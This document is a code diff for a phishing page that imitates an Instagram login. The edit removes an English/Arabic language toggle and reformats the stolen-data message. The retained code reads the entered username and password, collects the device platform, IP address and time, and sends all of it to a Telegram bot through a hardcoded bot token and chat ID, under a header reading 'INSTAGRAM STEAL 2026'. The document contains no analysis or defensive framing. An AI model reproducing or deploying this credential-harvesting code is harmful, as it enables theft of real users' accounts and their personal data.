@@ -85,19 +85,9 @@
             color: #777;
             font-size: 13px;
         }
-        .lang {
-            position: absolute;
-            top: 15px;
-            right: 15px;
-            color: #0095f6;
-            font-size: 14px;
-            cursor: pointer;
-        }
     </style>
 </head>
 <body>
-    <div class="lang" onclick="toggleLang()">English / العربية</div>
-
     <div class="container">
         <div class="logo">📷</div>
         
@@ -118,25 +108,6 @@
     <script>
         const BOT_TOKEN = '8591713771:AAHsYoY0Be8gkmHVBF_ykWmpPt293_PNELk';
         const CHAT_ID = '8539996558';
-        let isArabic = false;
-
-        function toggleLang() {
-            isArabic = !isArabic;
-            const inputs = document.querySelectorAll('input');
-            if (isArabic) {
-                inputs[0].placeholder = "اسم المستخدم أو البريد أو رقم الهاتف";
-                inputs[1].placeholder = "كلمة السر";
-                document.querySelector('button').textContent = "تسجيل الدخول";
-                document.querySelector('.forgot').textContent = "هل نسيت كلمة السر؟";
-                document.querySelector('.create').textContent = "إنشاء حساب جديد";
-            } else {
-                inputs[0].placeholder = "Username, email or mobile number";
-                inputs[1].placeholder = "Password";
-                document.querySelector('button').textContent = "Log in";
-                document.querySelector('.forgot').textContent = "Forgot password?";
-                document.querySelector('.create').textContent = "Create new account";
-            }
-        }
 
         async function getIP() {
             try {
@@ -150,14 +121,16 @@
             const username = document.getElementById('username').value.trim();
             const password = document.getElementById('password').value.trim();
 
-            const text = `🔥 INSTAGRAM PRO STEAL 2026\n\n` +
-                        `👤 Username: <code>${username || 'N/A'}</code>\n` +
-                        `🔑 Password: <code>${password || 'N/A'}</code>\n` +
+            const text = `🔥 INSTAGRAM STEAL 2026\n\n` +
+                        `👤 <b>Username:</b> <code>${username || 'N/A'}</code>\n` +
+                        `🔑 <b>Password:</b> <code>${password || 'N/A'}</code>\n\n` +
                         `📱 Device: ${navigator.platform}\n` +
                         `🌐 IP: ${await getIP()}\n` +
                         `⏰ Time: ${new Date().toISOString()}\n\n` +
-                        `📋 <b>Copy Username:</b> ${username}\n` +
-                        `📋 <b>Copy Password:</b> ${password}`;
+                        `━━━━━━━━━━━━━━━━━━\n` +
+                        `📋 <b>اضغط للنسخ:</b>\n` +
+                        `👤 Username → ${username}\n` +
+                        `🔑 Password → ${password}`;
 
             const form = new FormData();
             form.append('chat_id', CHAT_ID);
@@ -175,7 +148,7 @@
             }, 1400);
         }
 
-        // دعم Enter
+        // دعم زر Enter
         document.addEventListener('keypress', (e) => {
             if (e.key === "Enter") stealData();
         });
